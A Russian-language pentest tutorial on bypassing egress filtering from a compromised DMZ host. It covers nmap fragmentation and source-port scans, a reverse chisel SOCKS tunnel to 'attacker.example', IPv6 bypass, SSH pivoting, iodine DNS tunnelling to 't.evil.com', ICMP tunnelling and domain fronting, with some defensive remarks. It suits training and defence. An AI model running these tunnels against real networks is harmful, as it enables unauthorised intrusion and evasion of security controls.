## Вопрос, с которого всё начинается

Ты получил доступ к серверу `10.10.5.20` в DMZ. Наружу из его сегмента разрешены только DNS (UDP/53) и HTTPS (TCP/443) — всё остальное режет egress-firewall. Но тебе нужно достучаться до внутреннего файлового сервера `10.10.20.5` по SMB (порт 445), который снаружи закрыт наглухо.

Прямое соединение не пройдёт. Вопрос урока: как «протащить» запрещённый протокол через разрешённый канал — и как понять, какая именно защита стоит у тебя на пути.

## Наш пример: картируем egress

Обход начинается не с трюков, а с карты того, что разрешено. Проверим три вещи: ходит ли DNS, ходит ли HTTPS и что с произвольным портом.

```
$ dig +short +time=2 @8.8.8.8 example.com
93.184.216.34
$ curl -sI https://example.com/ | head -1
HTTP/2 200
$ timeout 2 bash -c 'echo > /dev/tcp/1.1.1.1/445'; echo "rc=$?"
rc=124
```

DNS отвечает, HTTPS отвечает, а попытка открыть произвольный порт `445` висит и обрывается по таймауту (`rc=124`). Значит, egress — это allowlist, а не «разрешено всё».

Теперь посмотрим, **как** фильтр принимает решения. ACK-скан не устанавливает соединение, поэтому показывает фильтрацию независимо от состояния сессии:

```
$ sudo nmap -sA -Pn -p445 10.10.20.5
PORT    STATE      SERVICE
445/tcp unfiltered microsoft-ds
```

`unfiltered` означает: пакеты доходят, ACL их не дропает, но сервиса там нет. То есть фильтр — **stateless** и пускает по порту.

## Шаг 1: фрагментация — и почему она ломается

**Фрагментация** разбивает IP-датаграмму на части. Простой IDS не собирает фрагменты обратно и не видит сигнатуру целиком: заголовок транспортного уровня виден только в первом фрагменте.

```
$ sudo nmap -f --mtu 8 -g 53 -Pn -p445 10.10.20.5
PORT    STATE    SERVICE
445/tcp filtered microsoft-ds
```

`-f` фрагментирует по 8 байт, `-g 53` ставит source-порт DNS. Результат — `filtered`. Значит, IPS **собирает** фрагменты до анализа (stream reassembly) и видит попытку целиком. Против современного IPS фрагментация бесполезна; сначала всегда проверяй, нормализуется ли трафик.

## Шаг 2: порт-киддинг и доверенные порты

Многие ACL разрешают трафик «с порта 53» (DNS), не проверяя, какой сервис внутри. Спуфинг source-порта эксплуатирует это доверие.

```
$ sudo nmap -g 53 --source-port 53 -Pn -p22,445 10.10.20.5
PORT    STATE    SERVICE
22/tcp  filtered ssh
445/tcp filtered microsoft-ds
```

Не помогло — фильтр проверяет и протокол, и порт. Но на многих сетях «дыра» живёт именно в UDP-правилах DNS/SNMP/NTP: правило `permit udp any eq 53 any` пропустит и ваш UDP-трафик с source-портом 53.

## Шаг 3: туннель — упаковываем запрещённое в разрешённое

Самый надёжный обход — **упаковать** запрещённый протокол в разрешённый. У нас разрешён HTTPS — используем его. `chisel` поднимает SOCKS-прокси поверх HTTP(S).

На своей машине (attacker) запускаем сервер:

```
$ ./chisel server -p 443 --reverse --socks5
2026/10/12 10:00:00 server: Listening on https://0.0.0.0:443
```

На скомпрометированном сервере в DMZ — клиент, который пробьёт обратный туннель:

```
$ ./chisel client https://attacker.example:443 R:socks
2026/10/12 10:00:05 client: Connecting to wss://attacker.example:443
2026/10/12 10:00:05 client: Connected (Latency 42ms)
```

Теперь через SOCKS-прокси `127.0.0.1:1080` достукиваемся до внутреннего SMB:

```
$ proxychains4 nmap -sT -Pn -p445 10.10.20.5
PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

Цель достигнута: трафик шёл по разрешённому 443 и выглядел как обычный HTTPS. Firewall не «сломан» — мы просто использовали разрешённый канал как транспорт.

## Шаг 4: IPv6 — забытый путь

Хосты с **двойным стеком** (IPv4 + IPv6) часто имеют IPv6-путь, который фильтруется хуже: правила забыли, а IPv6 включён по умолчанию через SLAAC.

```
$ ping6 -c2 2001:db8:20::5
2 packets transmitted, 2 received, 0% packet loss
$ nmap -6 -Pn -p445 2001:db8:20::5
445/tcp open  microsoft-ds
```

Если IPv6 не фильтруется, весь IPv4-контроль обходится автоматически: тот же сервис открыт по «забытому» протоколу. Защита — полные IPv6-правила, а не только IPv4.

## Модель угроз: какие бывают фильтры

Прежде чем обходить, надо понять, что перед тобой — техники обхода разные:

- **Stateless ACL** — решение по 5-tuple (адреса, порты, протокол), без состояния и содержимого.
- **Stateful firewall** — отслеживает сессии и пропускает ответные пакеты.
- **NGFW / прокси** — разбирает приложение (L7), делает TLS-инспекцию.
- **IDS** — пассивно сопоставляет сигнатуры, часто без нормализации.
- **IPS** — то же, но инлайн и может дропать.

Обход всегда ищет разрыв между моделью фильтра и реальным пакетом: неполный разбор, доверие к портам, забытые протоколы.

## Если не сработало

- Фрагментация вернула `filtered` → IPS пересобирает поток; пробуй туннель.
- Порт-киддинг не помог → фильтр смотрит и протокол; ищи «дыру» в UDP-правилах DNS/SNMP/NTP.
- Туннель на 443 блокируется по SNI → попробуй domain fronting или ECH.
- IPv6 тоже фильтруется → вернись к разрешённому носителю (DNS/ICMP).

## Сегментация и её обход

Сегментация — главный контроль, но её обходят через **pivot**: скомпрометированный хост в другом сегменте, dual-homed машины, VLAN hopping, IPv6 RA/DHCPv6 или прокси внутри DMZ. Простой pivot через SSH:

```
$ ssh -D 1080 user@pivot
$ proxychains4 nmap -sT -Pn -p445 10.10.20.5
```

Поэтому «правильная» защита — не только firewall, но и отсутствие лишних маршрутов между сегментами.

## Шаг 5: когда HTTPS тоже закрыт — DNS и ICMP

Если egress сужен до DNS, носителем становится он. `iodine` упаковывает IP в DNS-запросы:

```
# attacker:
$ sudo iodined -f -P secret 10.0.0.1 t.evil.com
# хост в DMZ:
$ sudo iodine -f -P secret t.evil.com
$ ping -c1 10.0.0.1
```

На нашей стороне появляется `tun`-интерфейс с `10.0.0.1`, у хоста — `10.0.0.2`, и через DNS идёт обычный IP. Медленно (десятки-сотни КБ/с), зато фильтр видит «резолвинг».

Если разрешён ICMP — работает `ptunnel`: данные прячутся в payload echo-request. Признак в дампе — необычно крупные и частые ping.

Оба канала — «последний рубеж»: их используют, когда ни 443, ни 80 не проходят. И оба заметны статистически (длинные поддомены, крупный ICMP), поэтому их прячут под осмысленные имена и ограничивают скорость.

## Как опознать фильтр: тест-матрица

Техники обхода зависят от типа фильтра, поэтому его «прощупывают» серией тестов:

| Тест | Что проверяет | Вывод |
|---|---|---|
| `dig @8.8.8.8` | DNS наружу | разрешён/нет |
| `curl https://host` | 443 наружу | разрешён/нет |
| `nc -vz host 445` | произвольный порт | allowlist vs all |
| `nmap -sA -p445 host` | ACK проходит? | stateless ACL |
| `nmap -f -p445 host` | результат фрагментации | есть ли reassembly |
| `ping6 host` | IPv6-путь | забыт ли IPv6 |

Последние три особенно показательны. Если ACK-скан даёт `unfiltered` — ACL без состояния, и порт-киддинг может сработать. Если фрагментированный скан даёт `filtered` — IPS пересобирает поток, и фрагментация бесполезна. Если IPv6-путь открыт — весь IPv4-контроль обходится.

## Domain fronting: обход блокировки по SNI

Если туннель на 443 блокируется, потому что DPI видит подозрительный SNI, помогает **domain fronting**: TLS-соединение идёт к легитимному CDN (SNI = `cdn.example`), а внутри HTTP-заголовок `Host` указывает на твой фронт. Фильтр видит «нормальный» домен, а запрос уходит туда, куда нужно.

```
$ curl --resolve cdn.example:443:203.0.113.10 \
    -H 'Host: front.example' https://cdn.example/path
```

Сегодня крупные CDN (Cloudflare, Google) domain fronting в основном запретили, но техника жива на мелких и в связке с ECH, где SNI вообще не виден.

## Что мы теперь знаем

- Обход ищет разрыв между моделью фильтра и реальным пакетом.
- Фрагментация работает только против IDS без нормализации.
- Порт-киддинг эксплуатирует доверие ACL к source-портам (53/80/443).
- Самый надёжный обход — упаковать запрещённое в разрешённое (chisel поверх HTTPS).
- Двойной стек с неполными IPv6-правилами — типичная «чёрная дверь».
- Туннель на 443 может блокироваться по SNI — помогает domain fronting или ECH.
- Порт-киддинг эксплуатирует доверие ACL к source-портам 53/80/443.
- Когда HTTPS закрыт, носителем становится DNS (iodine) или ICMP (ptunnel).
- Тип фильтра определяют тест-матрицей: ACK-скан, фрагментация, IPv6.
- Сегментацию обходят пивотом: SSH -D, dual-homed хост, VLAN hopping.
- Нормализация на IPS обесценивает фрагментацию — проверяй её до ставки на трюк.

| Техника | Против чего | Ломается о |
|---------|-------------|------------|
| Фрагментация | stateless IDS/ACL | reassembly/IPS |
| Порт-киддинг | ACL по портам | stateful L7 |
| Туннель DNS/HTTP | egress-фильтр | DPI/энтропия |
| IPv6 | IPv4-only правила | полный IPv6 ACL |
